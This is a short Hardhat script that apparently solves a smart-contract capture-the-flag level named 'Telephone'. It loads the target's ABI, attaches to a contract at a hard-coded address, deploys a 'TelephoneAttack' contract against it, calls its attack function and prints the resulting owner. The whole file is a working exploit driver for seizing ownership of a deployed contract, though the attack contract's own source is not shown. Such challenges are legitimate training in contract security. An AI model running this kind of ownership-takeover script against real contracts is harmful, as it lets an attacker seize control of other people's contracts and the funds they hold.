import { ethers } from "hardhat";
import fs from "fs";
import path from "path";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0x1aF715ff6Ecf80F7296166d8cBeA810619815271";

  const abiPath = path.join(__dirname, "..", "abis", "telephone.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // function call
  const attackContract = await ethers.getContractFactory("TelephoneAttack");
  const attack = await attackContract.deploy(instanceAddress);
  await attack.waitForDeployment();
  console.log("Attack Contract deployed:", await attack.getAddress());

  const tx = await attack.attack();
  await tx.wait();

  console.log(await contract.owner());
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
